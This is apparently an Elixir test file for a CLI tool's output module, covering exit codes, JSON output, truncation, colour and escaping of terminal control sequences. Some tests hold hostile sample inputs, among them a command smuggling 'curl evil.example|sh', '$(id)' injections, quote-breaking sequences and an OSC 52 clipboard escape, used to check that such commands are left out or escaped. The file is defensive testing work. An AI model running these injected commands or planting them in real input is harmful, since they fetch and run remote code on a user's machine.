defmodule Ehosctl.OutputTest do
  # Not async: capture_io(:stderr) captures stderr for every process, so tests that run
  # beside each other would read each other's errors, and each test compares stderr whole.
  use Ehosctl.Case, async: false

  import ExUnit.CaptureIO

  alias Ehosctl.Failure
  alias Ehosctl.Output

  doctest Ehosctl.Output
  doctest Ehosctl.Failure

  test "gives each kind of error its documented exit code, the same in every version" do
    assert Output.codes() == [
             failed: 1,
             invalid: 2,
             refused: 3,
             not_signed_in: 4,
             unreachable: 5
           ]
  end

  test "prints a result as words for a person, or as JSON" do
    result = %{text: "two roles", json: %{roles: ["a", "b"]}}

    assert capture_io(fn -> assert Output.result(result, false) == 0 end) == "two roles\n"

    assert capture_io(fn -> assert Output.result(result, true) == 0 end) ==
             ~s({"roles":["a","b"]}\n)
  end

  test "prints an error on stderr only, and returns its kind's code" do
    {code, stdout} =
      with_io(fn ->
        assert capture_io(:stderr, fn ->
                 send(self(), {:code, Output.error(:refused, "no", false)})
               end) == "ehosctl: no\n"

        assert_received {:code, code}
        code
      end)

    assert {code, stdout} == {3, ""}
  end

  test "--json escapes a bidirectional override and a C1 control, and stays the same JSON" do
    value = %{"label" => "a" <> <<0x202E::utf8>> <> "b" <> <<0x9B::utf8>> <> "c\n"}
    stdout = capture_io(fn -> Output.result(%{json: value}, true) end)

    assert stdout == ~S({"label":"a\u202Eb\u009Bc\n"}) <> "\n"
    assert JSON.decode!(stdout) == value
  end

  test "an error is printed to 64 KiB at most, whatever was added to it, cut between characters" do
    # One byte before two-byte characters puts the cut through one.
    long = "a" <> String.duplicate("é", 40_000)
    # 65,536 bytes: "refused: a" and 32,763 characters of two bytes each.
    cut_after_refused = "refused: a" <> String.duplicate("é", 32_763) <> "…"
    # 65,535 bytes: the character the cut went through is left out.
    cut = "a" <> String.duplicate("é", 32_767) <> "…"

    assert capture_io(:stderr, fn -> Output.error(:invalid, "refused: " <> long, false) end) ==
             "ehosctl: " <> cut_after_refused <> "\n"

    assert capture_io(:stderr, fn -> Output.error(:invalid, long, true) end) |> JSON.decode!() ==
             %{"error" => %{"kind" => "invalid", "message" => cut}}

    # Bytes that are not UTF-8 are kept, for the terminal's escaping to show.
    assert Output.bounded(<<0xFF>> <> long) == binary_part(<<0xFF>> <> long, 0, 65_536) <> "…"
    assert Ehosctl.Refusal.shown(long) == cut
  end

  test "an error built of many lines is printed to 64 KiB at most in all, as words and as JSON" do
    # 2,000 lines of 100 bytes: 200,000 bytes, 1,999 line ends between them.
    printed = Enum.map_join(1..2000, "\n", fn _ -> String.duplicate("a", 100) end)
    message = Output.lines(["helm failed.", Output.tool_output("helm", printed)])

    words = capture_io(:stderr, fn -> Output.error(:failed, message, false) end)
    assert byte_size(words) <= byte_size("ehosctl: ") + 65_536 + byte_size("…\n")
    assert String.ends_with?(words, "…\n")

    json = capture_io(:stderr, fn -> Output.error(:failed, message, true) end) |> JSON.decode!()
    assert byte_size(json["error"]["message"]) == 65_536 + byte_size("…")
  end

  test "an error cut at 64 KiB writes no colour codes after the cut, on a terminal" do
    stub(Ehosctl.TerminalMock, :error_terminal?, fn -> true end)
    message = Output.tool_output("helm", String.duplicate("x\n", 100_000))

    words = capture_io(:stderr, fn -> Output.error(:failed, message, false) end)
    # Before the cut, each line of one byte carries its indent and its codes, 11 bytes in all.
    refute words =~ "\e[2m\e[0m"
    assert byte_size(words) < 4 * 65_536
  end

  test "an error with what to do prints it under What to do, each command on its own line" do
    failure =
      Failure.new("You are not signed in to office.",
        advice: "Sign in again:",
        to_do: ["ehosctl login --installation office", "ehosctl whoami --installation office"]
      )

    assert capture_io(:stderr, fn -> assert Output.error(:not_signed_in, failure, false) == 4 end) ==
             """
             ehosctl: You are not signed in to office.
             What to do:
               Sign in again:
               ehosctl login --installation office
               ehosctl whoami --installation office
             """

    stub(Ehosctl.TerminalMock, :error_terminal?, fn -> true end)

    assert capture_io(:stderr, fn -> Output.error(:not_signed_in, failure, false) end) ==
             "\e[31mehosctl:\e[0m You are not signed in to office.\nWhat to do:\n  Sign in again:\n" <>
               "  \e[36mehosctl login --installation office\e[0m\n" <>
               "  \e[36mehosctl whoami --installation office\e[0m\n"
  end

  test "an error says what happened, why under it, and what to do last, each command whole on its own line" do
    failure =
      Failure.new("Nothing was set.",
        reason: "ehosctl does not read a value from a terminal.\nIt reads a pipe.",
        advice: "Give the value through a pipe:",
        to_do: ["pbpaste | ehosctl secrets set key --app ledger --env try --installation office"]
      )

    assert capture_io(:stderr, fn -> assert Output.error(:invalid, failure, false) == 2 end) ==
             """
             ehosctl: Nothing was set.
               ehosctl does not read a value from a terminal.
               It reads a pipe.
             What to do:
               Give the value through a pipe:
               pbpaste | ehosctl secrets set key --app ledger --env try --installation office
             """

    assert capture_io(:stderr, fn -> Output.error(:invalid, failure, true) end)
           |> JSON.decode!() == %{
             "error" => %{
               "kind" => "invalid",
               "message" =>
                 "Nothing was set. ehosctl does not read a value from a terminal.\nIt reads a " <>
                   "pipe. Give the value through a pipe: `pbpaste | ehosctl secrets set key " <>
                   "--app ledger --env try --installation office`.",
               "what_to_do" => [
                 "pbpaste | ehosctl secrets set key --app ledger --env try --installation office"
               ]
             }
           }
  end

  test "an error's words and its reason are cut at 64 KiB together, what to do kept whole" do
    failure =
      Failure.new(String.duplicate("a", 40_000),
        reason: String.duplicate("b", 40_000),
        to_do: ["ehosctl login"]
      )

    words = capture_io(:stderr, fn -> Output.error(:failed, failure, false) end)

    assert words ==
             "ehosctl: " <>
               String.duplicate("a", 40_000) <>
               "\n  " <>
               String.duplicate("b", 65_536 - 40_000) <>
               "…\nWhat to do:\n  ehosctl login\n"
  end

  test "an error whose first word is ehosctl names it once, red on a terminal" do
    print = fn message ->
      capture_io(:stderr, fn -> Output.error(:failed, message, false) end)
    end

    assert print.("ehosctl cannot read it.") == "ehosctl cannot read it.\n"

    assert print.(["ehosctl cannot ", Owl.Data.tag("read", :bright), " it."]) ==
             "ehosctl cannot read it.\n"

    assert print.(Failure.new("ehosctl changed nothing.", reason: "The file is empty.")) ==
             "ehosctl changed nothing.\n  The file is empty.\n"

    assert print.("ehosctlx is not a command.") == "ehosctl: ehosctlx is not a command.\n"
    assert print.("The ehosctl config is old.") == "ehosctl: The ehosctl config is old.\n"

    stub(Ehosctl.TerminalMock, :error_terminal?, fn -> true end)

    assert print.("ehosctl cannot read it.") == "\e[31mehosctl\e[0m cannot read it.\n"
  end

  test "an error shows what another program printed under its name, before what to do" do
    failure =
      Failure.new("`helm` failed with exit status 1.",
        tool_output: [{"helm", "Error: Kubernetes cluster unreachable\n\e[2J"}],
        to_do: ["ehosctl server tunnel --installation office"]
      )

    assert capture_io(:stderr, fn -> assert Output.error(:failed, failure, false) == 1 end) ==
             """
             ehosctl: `helm` failed with exit status 1.
             helm printed:
               Error: Kubernetes cluster unreachable
               "\\u{1B}[2J"
             What to do:
               ehosctl server tunnel --installation office
             """

    # Under --json, what it printed is in the message, on the lines after what failed; JSON
    # escapes the control character itself.
    assert capture_io(:stderr, fn -> Output.error(:failed, failure, true) end)
           |> JSON.decode!() == %{
             "error" => %{
               "kind" => "failed",
               "message" =>
                 "`helm` failed with exit status 1.\nError: Kubernetes cluster unreachable\n\e[2J " <>
                   "Run `ehosctl server tunnel --installation office`.",
               "what_to_do" => ["ehosctl server tunnel --installation office"]
             }
           }
  end

  test "an error under --json lists only the commands it prints as words under what_to_do" do
    left_out = "ehosctl env remove '--yes' --installation office"
    kept = "ehosctl env list --installation office"

    for {to_do, json} <- [
          {[left_out, kept], %{"what_to_do" => [kept]}},
          {[left_out], %{}}
        ] do
      failure = Failure.new("It failed.", advice: "To see them, run:", to_do: to_do)

      message =
        if to_do == [left_out],
          do: "It failed.",
          else: "It failed. To see them, run: `#{kept}`."

      assert capture_io(:stderr, fn -> Output.error(:failed, failure, true) end)
             |> JSON.decode!() == %{
               "error" => Map.merge(%{"kind" => "failed", "message" => message}, json)
             }
    end
  end

  test "a result's warnings follow its words on stderr, and are left out of JSON" do
    result = %{text: "✓ Done.", json: %{"done" => true}, warnings: [{"Late.", "Look later."}]}

    assert capture_io(:stderr, fn ->
             assert capture_io(fn -> assert Output.result(result, false) == 0 end) ==
                      "✓ Done.\n"
           end) == "! Late.\n  Look later.\n"

    assert capture_io(:stderr, fn ->
             assert capture_io(fn -> assert Output.result(result, true) == 0 end) ==
                      ~s({"done":true}\n)
           end) == ""
  end

  test "what another program printed is cut at 64 KiB, as cloud-init's status can be any length" do
    printed = String.duplicate("node\n", 20_000)

    assert Output.tool_output("kubectl get nodes", printed)
           |> Output.render(false)
           |> IO.chardata_to_string()
           |> String.ends_with?("\n  node\n  n…")
  end

  test "warnings in JSON are plain text, escaped by JSON as an error is, and cut at 64 KiB" do
    long = String.duplicate("a", 70_000)

    json =
      Output.warnings_json([
        {Owl.Data.tag("Late\e[2J.", :yellow), "A\tb."},
        {long, nil}
      ])

    assert json == [
             %{"head" => "Late\e[2J.", "explanation" => "A\tb."},
             %{"head" => String.duplicate("a", 65_536) <> "…", "explanation" => nil}
           ]

    assert Output.json(hd(json)) == ~S({"explanation":"A\tb.","head":"Late\u001B[2J."})
  end

  test "warn and aside print nothing under --json" do
    assert capture_io(:stderr, fn ->
             assert Output.warn("Late.", "Look later.", true) == :ok
             assert Output.aside("A program said this.", true) == :ok
           end) == ""
  end

  test "warn, aside and progress cut each string at 64 KiB, as an error is cut" do
    long = String.duplicate("a", 70_000)
    cut = String.duplicate("a", 65_536) <> "…"

    assert capture_io(:stderr, fn -> Output.aside(long) end) == cut <> "\n"
    assert capture_io(:stderr, fn -> Output.progress(long) end) == "==> " <> cut <> "\n"

    assert capture_io(:stderr, fn -> Output.warn(long) end) ==
             "! " <> String.slice(cut, 0, 65_534) <> "…\n"
  end

  test "an error with what to do is one sentence under --json, its commands a list beside it" do
    failure = Failure.new("It failed.", to_do: ["ehosctl login --installation office"])

    assert capture_io(:stderr, fn -> Output.error(:failed, failure, true, %{"code" => "x"}) end)
           |> JSON.decode!() == %{
             "error" => %{
               "kind" => "failed",
               "message" => "It failed. Run `ehosctl login --installation office`.",
               "what_to_do" => ["ehosctl login --installation office"],
               "code" => "x"
             }
           }

    advice_alone = Failure.new("It did not answer.", advice: "Run the command again.")

    assert capture_io(:stderr, fn -> Output.error(:unreachable, advice_alone, true) end)
           |> JSON.decode!() == %{
             "error" => %{
               "kind" => "unreachable",
               "message" => "It did not answer. Run the command again."
             }
           }
  end

  test "an error that says nothing to do prints what failed alone" do
    failure = Failure.added(Failure.new("https://ehos.example.com did not answer."), " More.")

    assert capture_io(:stderr, fn -> assert Output.error(:unreachable, failure, false) == 5 end) ==
             "ehosctl: https://ehos.example.com did not answer. More.\n"
  end

  test "an error cut at 64 KiB keeps what to do whole after the cut" do
    failure = Failure.new(String.duplicate("a", 70_000), to_do: ["ehosctl env show"])

    assert capture_io(:stderr, fn -> Output.error(:failed, failure, false) end) ==
             "ehosctl: " <>
               String.duplicate("a", 65_536) <> "…\nWhat to do:\n  ehosctl env show\n"
  end

  test "what an error says to do is escaped as the rest of its words are, a command left out" do
    failure = Failure.new("Bad \e[2J.", advice: "Do \e[2J.", to_do: ["ehosctl \e[2J"])

    assert capture_io(:stderr, fn -> Output.error(:failed, failure, false) end) ==
             ~S(ehosctl: "Bad \u{1B}[2J.") <> "\nWhat to do:\n  " <> ~S("Do \u{1B}[2J.") <> "\n"
  end

  test "an error whose every command is left out, with no advice, prints what failed alone" do
    failure = Failure.new("It failed.", to_do: ["ehosctl env show \e[2J"])

    assert capture_io(:stderr, fn -> Output.error(:failed, failure, false) end) ==
             "ehosctl: It failed.\n"
  end

  test "a refusal of EHOS's prints its code beside its kind and message under --json alone" do
    refusal = %{"code" => "in_use"}

    print = fn json? ->
      capture_io(:stderr, fn -> Output.error(:failed, "In use.", json?, refusal) end)
    end

    assert JSON.decode!(print.(true)) ==
             %{"error" => %{"kind" => "failed", "message" => "In use.", "code" => "in_use"}}

    assert print.(false) == "ehosctl: In use.\n"
  end

  test "a refusal's own message is what --json prints, where the words say more" do
    refusal = %{"code" => "too_many_ephemeral", "message" => "At the count.", "cap" => 6}

    stderr =
      capture_io(:stderr, fn ->
        Output.error(:failed, "At the count.\nThe list.", true, refusal)
      end)

    assert JSON.decode!(stderr) == %{
             "error" => %{
               "kind" => "failed",
               "message" => "At the count.",
               "code" => "too_many_ephemeral",
               "cap" => 6
             }
           }
  end

  test "an error under --json escapes the same characters" do
    message = "a" <> <<0x202E::utf8>> <> "b"

    stderr = capture_io(:stderr, fn -> Output.error(:invalid, message, true) end)

    assert stderr == ~S({"error":{"message":"a\u202Eb","kind":"invalid"}}) <> "\n"
    assert JSON.decode!(stderr) == %{"error" => %{"kind" => "invalid", "message" => message}}
  end

  test "prints an error's words escaped, and its JSON whole, bytes that are not UTF-8 included" do
    stderr =
      capture_io(:stderr, fn -> assert Output.error(:failed, "x\e[2J\n\xFF", false) == 1 end)

    assert stderr == "ehosctl: " <> ~S("x\u{1B}[2J") <> "\n" <> ~S("\xFF") <> "\n"

    stderr = capture_io(:stderr, fn -> assert Output.error(:failed, "x\xFF", true) == 1 end)
    assert JSON.decode!(stderr) == %{"error" => %{"kind" => "failed", "message" => "x�"}}
  end

  test "prints a result's words escaped, as a node a server describes" do
    stdout = capture_io(fn -> Output.result(%{text: "node \e]52;c;eA==\a", json: nil}, false) end)
    assert stdout == ~S("node \u{1B}]52;c;eA==\u{7}") <> "\n"
  end

  describe "the shapes" do
    test "print a result as aligned lines with no colour code where stdout is no terminal" do
      text =
        Output.lines([
          Output.outcome(:done, "The server ehos-office is up."),
          Output.values([
            {"Address", "203.0.113.10"},
            {"SSH host key", "ssh-ed25519 SHA256:abc\nCompare it with the console."}
          ]),
          "",
          Output.next(["ehosctl server tunnel --installation office"])
        ])

      assert capture_io(fn -> Output.result(%{text: text, json: nil}, false) end) == """
             ✓ The server ehos-office is up.
               Address        203.0.113.10
               SSH host key   ssh-ed25519 SHA256:abc
                              Compare it with the console.

             Next:
               ehosctl server tunnel --installation office
             """
    end

    test "colour a result on a terminal, around the tags alone" do
      stub(Ehosctl.TerminalMock, :output_terminal?, fn -> true end)
      text = Output.lines([Output.outcome(:failed, "Not up."), Output.next(["ehosctl doctor"])])

      assert capture_io(fn -> Output.result(%{text: text, json: nil}, false) end) ==
               "\e[31m✗\e[0m Not up.\nNext:\n  \e[36mehosctl doctor\e[0m\n"
    end

    test "escape what a server wrote before colouring it, so its own codes never reach a terminal" do
      stub(Ehosctl.TerminalMock, :output_terminal?, fn -> true end)
      text = Output.values([{"Node", "ready\e[2J"}])

      assert capture_io(fn -> Output.result(%{text: text, json: nil}, false) end) ==
               "  \e[2mNode\e[0m   \e[1m" <> ~S("ready\u{1B}[2J") <> "\e[0m\n"
    end

    test "colour nothing when NO_COLOR holds a value, and colour when it is empty" do
      stub(Ehosctl.TerminalMock, :output_terminal?, fn -> true end)
      result = %{text: Output.outcome(:done, "Done."), json: nil}

      stub_env(%{"NO_COLOR" => "1"})
      assert capture_io(fn -> Output.result(result, false) end) == "✓ Done.\n"

      stub_env(%{"NO_COLOR" => ""})
      assert capture_io(fn -> Output.result(result, false) end) == "\e[32m✓\e[0m Done.\n"
    end

    test "never colour JSON, on a terminal too" do
      stub(Ehosctl.TerminalMock, :output_terminal?, fn -> true end)
      stub(Ehosctl.TerminalMock, :error_terminal?, fn -> true end)

      assert capture_io(fn -> Output.result(%{text: "x", json: %{"a" => 1}}, true) end) ==
               ~s({"a":1}\n)

      message = Output.lines(["No sign-in.", Output.what_to_do(["ehosctl login"])])

      assert capture_io(:stderr, fn -> Output.error(:not_signed_in, message, true) end)
             |> JSON.decode!() == %{
               "error" => %{
                 "kind" => "not_signed_in",
                 "message" => "No sign-in.\nWhat to do:\n  ehosctl login"
               }
             }
    end

    test "colour an error's prefix only where stderr is a terminal" do
      message = Output.lines(["No sign-in.", Output.what_to_do(["ehosctl login"])])

      print = fn ->
        capture_io(:stderr, fn -> Output.error(:not_signed_in, message, false) end)
      end

      assert print.() == "ehosctl: No sign-in.\nWhat to do:\n  ehosctl login\n"

      stub(Ehosctl.TerminalMock, :error_terminal?, fn -> true end)

      assert print.() ==
               "\e[31mehosctl:\e[0m No sign-in.\nWhat to do:\n  \e[36mehosctl login\e[0m\n"
    end

    test "print progress and warnings on stderr, and nothing on stdout" do
      stub(Ehosctl.TerminalMock, :error_terminal?, fn -> true end)

      {:ok, stdout} =
        with_io(fn ->
          assert capture_io(:stderr, fn ->
                   Output.progress("Making the server \e]52;c;eA==\a")
                   Output.warn("No keychain.", "The sign-in is kept in a file.\n\nIt is private.")
                 end) ==
                   "\e[2m==>\e[0m " <>
                     ~S("Making the server \u{1B}]52;c;eA==\u{7}") <>
                     "\n\e[33m! No keychain.\e[0m\n  The sign-in is kept in a file.\n\n  It is private.\n"

          :ok
        end)

      assert stdout == ""
    end

    test "frame what another program printed, each of its lines escaped on its own" do
      assert Output.tool_output("tofu", "Plan: 1\n\e[1mApply\e[0m\n")
             |> Output.render(false)
             |> IO.chardata_to_string() ==
               "tofu printed:\n  Plan: 1\n  " <> ~S("\u{1B}[1mApply\u{1B}[0m")
    end

    test "leave out a command a terminal would act on, which double quotes would let a shell run" do
      named = "ehosctl env bind 'x$(curl evil.example|sh)\e' RESOURCE --installation office"

      assert shown(Output.next(["ehosctl env list", named])) == "Next:\n  ehosctl env list"
      assert shown(Output.next([named])) == ""
      assert shown(Output.lines(["✓ Done.", "", Output.next([named])])) == "✓ Done."
      assert shown(Output.what_to_do([named])) == ""

      assert shown(Output.what_to_do([named], "Open the console.")) ==
               "What to do:\n  Open the console."
    end

    test "leave out the advice that introduced the commands when none is left, rather than end in run:" do
      named = "ehosctl server up --installation office --version 'x$(id)'\\''\e'"

      assert shown(Output.what_to_do([named], "To keep them, run:")) == ""

      assert shown(Output.lines(["✓ Done.", Output.what_to_do([named], "To keep them, run:")])) ==
               "✓ Done."

      failure = Failure.new("It failed.", advice: "To see its state later, run:", to_do: [named])

      assert capture_io(:stderr, fn -> Output.error(:failed, failure, false) end) ==
               "ehosctl: It failed.\n"
    end

    test "leave out a sentence that offers a command a terminal would act on, or say another" do
      offered = [" Run ", {:command, "ehosctl env remove 'x$(id)'\\''y'"}, " to remove it."]
      assert Output.offered(offered) == " Run `ehosctl env remove 'x$(id)'\\''y'` to remove it."

      named = [" Run ", {:command, "ehosctl env remove 'x$(id)'\\''\e'"}, " to remove it."]
      assert Output.offered(named) == ""
      assert Output.offered(named, " Remove it.") == " Remove it."

      # As a line `render/2` would quote, the `'\''` and the `$(…)` would reach a shell unquoted.
      assert shown("Done." <> Output.offered(named)) == "Done."
    end

    test "leave out a command whose value starts with a dash or holds a backslash, and the advice that introduced it" do
      # Each value as `EhosPlatform.Shell.word/1` quotes it: an option of the command, and a
      # backslash that fish reads inside single quotes, where `'\''` ends the quote.
      for value <- ["--installation=other", "-rf", ~S{\';id;\'}, ~S{a\b}] do
        command = "ehosctl env remove #{EhosPlatform.Shell.word(value)} --installation office"

        assert shown(Output.next([command, "ehosctl env list"])) == "Next:\n  ehosctl env list"
        assert shown(Output.what_to_do([command], "To keep them, run:")) == ""

        assert Output.offered([" Run ", {:command, command}, " to remove it."], " Remove it.") ==
                 " Remove it."

        assert Failure.pasted("Open the console.", [command]) == {"Open the console.", []}
      end
    end

    test "check the command, not the pieces that backquotes in a value shown around it make" do
      # A value from EHOS with one backquote before the command and one after it pairs the
      # backquotes otherwise than ehosctl wrote them: read by its backquotes, the sentence
      # would check `x` and `y` and leave the command unchecked.
      sentence = [
        " x`y is there. Run ",
        {:command, "ehosctl env remove '--yes'"},
        ". x`y is there."
      ]

      assert Output.offered(sentence, " Remove it.") == " Remove it."

      kept = [" x`y is there. Run ", {:command, "ehosctl env remove 'x$(id)'"}, "."]
      assert Output.offered(kept) == " x`y is there. Run `ehosctl env remove 'x$(id)'`."
    end

    test "leave out a command that holds a backquote, which would read as its end" do
      command = "ehosctl env remove #{EhosPlatform.Shell.word("a`b")}"

      assert Output.offered([" Run ", {:command, command}, " to remove it."], " Remove it.") ==
               " Remove it."
    end

    test "keep a command whose option ehosctl wrote, and a value with a quote in it" do
      command = "ehosctl env remove #{EhosPlatform.Shell.word("it's")} --installation office"

      assert shown(Output.next([command])) == "Next:\n  " <> command

      assert Output.offered([" Run ", {:command, command}, " to remove it."]) ==
               " Run `#{command}` to remove it."
    end

    defp shown(text) do
      text |> Output.render(false) |> IO.chardata_to_string()
    end

    test "print a tag inside a tag without colour, as words and as JSON" do
      state = Output.values([{"State", Owl.Data.tag("ready", :green)}])

      assert capture_io(fn -> Output.result(%{text: state, json: nil}, false) end) ==
               "  State   ready\n"

      assert capture_io(:stderr, fn -> Output.error(:failed, state, true) end)
             |> JSON.decode!() == %{
               "error" => %{"kind" => "failed", "message" => "  State   ready"}
             }
    end

    test "split a value and a warning at Windows line ends as at Unix ones" do
      text =
        Output.lines([
          Output.values([{"Node", "a\r\nb"}]),
          Output.warning("Slow.", "one\r\ntwo")
        ])

      assert text |> Output.render(false) |> IO.chardata_to_string() ==
               "  Node   a\n         b\n! Slow.\n  one\n  two"
    end

    test "put back the tags around an inner tag where it ends" do
      text = Owl.Data.tag(["a ", Owl.Data.tag("b", :bright), " c"], :yellow)

      assert text |> Output.render(true) |> IO.chardata_to_string() ==
               "\e[33ma \e[1mb\e[0m\e[33m c\e[0m"
    end
  end

  describe "printed/2" do
    test "frames what a program prints as it runs, each line indented, a line cut across parts kept whole" do
      parts = ["==> jose\r", "\nCompiling 3 fi", "les\nShall I install Hex? [Yn] ", "y\ndone"]

      assert capture_io(:stderr, fn ->
               parts |> Enum.reduce(Output.printing(), &Output.printed/2) |> Output.printed_end()
             end) == """
               ==> jose
               Compiling 3 files
               Shall I install Hex? [Yn] y
               done
             """
    end

    test "keeps a character cut across two parts whole, and escapes what a terminal would act on" do
      <<first, rest::binary>> = "é"

      assert capture_io(:stderr, fn ->
               ["caf", <<first>>, rest <> "\n", "\e[2Jboom\n"]
               |> Enum.reduce(Output.printing(), &Output.printed/2)
               |> Output.printed_end()
             end) == "  café\n  " <> ~S("\u{1B}[2Jboom") <> "\n"
    end

    test "dims each line on a terminal, and prints the start of a character never finished" do
      stub(Ehosctl.TerminalMock, :error_terminal?, fn -> true end)

      assert capture_io(:stderr, fn ->
               ["ok\n", <<0xC3>>]
               |> Enum.reduce(Output.printing(), &Output.printed/2)
               |> Output.printed_end()
             end) == "  \e[2mok\e[0m\n  \e[2m" <> ~S("\xC3") <> "\e[0m\n"
    end
  end

  describe "secrets" do
    test "give each secret's label and place, and a warning only where a person must act now" do
      {values, warnings} =
        Output.secrets([
          %EhosPlatform.Secret{
            kind: :refresh_token,
            place: "/home/a/.ehos/office.token",
            new?: true
          },
          %EhosPlatform.Secret{kind: :printed_credential, place: "stdout", new?: true},
          %EhosPlatform.Secret{kind: :trusted_ca, place: "config.json", new?: true},
          %EhosPlatform.Secret{kind: :kubeconfig, place: "/home/a/.ehos/office/kubeconfig"}
        ])

      assert {values,
              Enum.map(warnings, &(&1 |> Output.render(false) |> IO.chardata_to_string()))} ==
               {[
                  {"Sign-in", "/home/a/.ehos/office.token"},
                  {"Credential", "stdout"},
                  {"Trusted CA", "config.json"},
                  {"Kubeconfig", "/home/a/.ehos/office/kubeconfig"}
                ],
                [
                  "! With the refresh token, a person acts as you until it expires or you run ehosctl logout.\n" <>
                    "  Keep it to yourself. Do not share it."
                ]}
    end

    test "under --json, give the kind, the place, the keeper and if it is new, and no value" do
      secrets = [
        %EhosPlatform.Secret{
          kind: :pull_credential,
          place: "ehos-system/ehos-pull-credential",
          new?: true
        },
        %EhosPlatform.Secret{
          kind: :external_database_role,
          place: "ehos-data/ehos-external-ledger",
          read_from: "ledger.password"
        }
      ]

      json =
        capture_io(fn ->
          Output.result(%{json: %{secrets: Output.secrets_json(secrets)}}, true)
        end)

      assert JSON.decode!(json) == %{
               "secrets" => [
                 %{
                   "kind" => "pull_credential",
                   "place" => "ehos-system/ehos-pull-credential",
                   "keeper" => "own",
                   "new" => true
                 },
                 %{
                   "kind" => "external_database_role",
                   "place" => "ehos-data/ehos-external-ledger",
                   "keeper" => "cluster",
                   "new" => true
                 }
               ]
             }
    end
  end

  # ehos-tools#165: what a server or another program said reaches the terminal.
  describe "shown_lines/1" do
    test "leaves text a terminal prints as it is, Windows line ends and tabs made plain" do
      assert Output.shown_lines("one\r\ntwo\tthree\nbox ╷│╵ 🧑‍💻 می‌خواهم") ==
               "one\ntwo    three\nbox ╷│╵ 🧑‍💻 می‌خواهم"
    end

    test "quotes a line with a character a terminal acts on, escaping that character alone" do
      long = String.duplicate("a", 5000)

      for {line, shown} <- [
            {"x\e[2J", ~S("x\u{1B}[2J")},
            {"a\rb", ~S("a\u{D}b")},
            {"csi \u009B31m", ~S("csi \u{9B}31m")},
            {"rtl \u202Eevil", ~S("rtl \u{202E}evil")},
            {"tag \u{E0041}hidden", ~S("tag \u{E0041}hidden")},
            {"bad \xFF byte", ~S("bad \xFF byte")},
            {~S(say "hi" \ there) <> "\e", ~S("say \"hi\" \\ there\u{1B}")},
            {long <> "\e", "\"" <> long <> ~S(\u{1B}")}
          ] do
        assert Output.shown_lines(line) == shown
      end
    end
  end
end
